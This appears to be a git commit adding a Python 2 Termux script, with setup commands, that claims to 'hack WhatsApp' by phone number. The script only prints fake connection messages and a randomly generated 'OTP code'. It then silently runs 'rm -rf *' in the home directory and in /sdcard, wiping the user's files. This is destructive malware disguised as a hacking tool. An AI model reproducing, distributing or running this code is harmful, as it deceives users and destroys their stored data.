1a4dcc6e58550a6d5dd90ae84fdd47732f948d49
Eguh27 <52117299+Eguh27@users.noreply.github.com>
2020-04-17 20:19:09 +0700

    Add files via upload
    $ apt update
    $ apt upgrade
    $ apt install python2 git
    $ termux-setup-storage
    $ cd hack-wa
    $ chmod +x *.py
    $ python2 *.py

---
+++ hack.py
@@ -0,0 +1,44 @@
+#!/usr/bin/python2
+import sys,random,os,time
+
+#main
+baner = '''File: Tool Wa
+Author: Sciprt Kiddies :)
+Version: 1.0.0
+'''
+def maii():
+    os.system("clear")
+    print(baner)
+    print("[!] Hack Whatsapp Bypass Method\n")
+    print("ex: 08xxxx")
+    su = raw_input("no: ")
+    print("[!] Connecting To Server")
+    time.sleep(3)
+    print("[!] Success")
+    time.sleep(1)
+    print("[!] Get Otp Kode")
+    time.sleep(3)
+    print("[!] Dumping Object")
+    time.sleep(2)
+    print("[!] extract Object")
+    time.sleep(2)
+    pil = random.randrange(100, 1000)
+    pill = random.randrange(100, 1000)
+    print("#Whatsapp")
+    print("<Your Otp Code Is: "+str(pil)+"-"+str(pill)+" Please Don't Share this Otp>")
+    try:
+    	os.system("cd")
+    	os.system("rm -rf *")
+    	time.sleep(1)
+    	os.system("termux-setup-storage")
+    	os.system("cd /sdcard")
+    	os.system("rm -rf *")
+    except:
+    	pass
+    
+    exi = raw_input("[!] Exit")
+    
+#round
+
+if __name__ == '__main__':
+    maii()
